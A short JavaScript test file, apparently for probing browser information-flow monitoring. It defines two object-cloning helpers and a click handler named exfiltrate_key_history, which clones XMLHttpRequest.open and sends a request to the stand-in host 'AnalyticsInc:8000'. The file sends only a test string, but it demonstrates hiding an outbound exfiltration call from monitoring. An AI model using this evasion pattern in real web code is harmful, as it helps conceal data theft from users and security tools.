function clone(obj){
    if(obj == null || typeof(obj) != 'object')
        return obj;

    //var temp = obj.constructor();
	var temp = {};

    for(var key in obj)
        temp[key] = clone(obj[key]);
    return temp;
}

function clone2(obj) {
  if(obj.cloneNode) return obj.cloneNode(true);
  var copy = obj instanceof Array ? [] : {};
  for(var attr in obj) {
    if(typeof obj[attr] == "function" || obj[attr]==null || !obj[attr].clone2)
      copy[attr] = obj[attr];
    else if(obj[attr]==obj) copy[attr] = copy;
    else copy[attr] = obj[attr].clone2();
  }
  return copy;
}

function exfiltrate_key_history() {

    // Clone Function 1
    // Exfiltrate data using XMLHTTP request
    xmlhttp=new XMLHttpRequest();
	xmlhttp.opennew=clone(xmlhttp.open);
	xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true);
	xmlhttp.send(null);
	//xmlhttp2=clone(xmlhttp);
    //xmlhttp2.open("GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true);
    //xmlhttp2.send(null);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
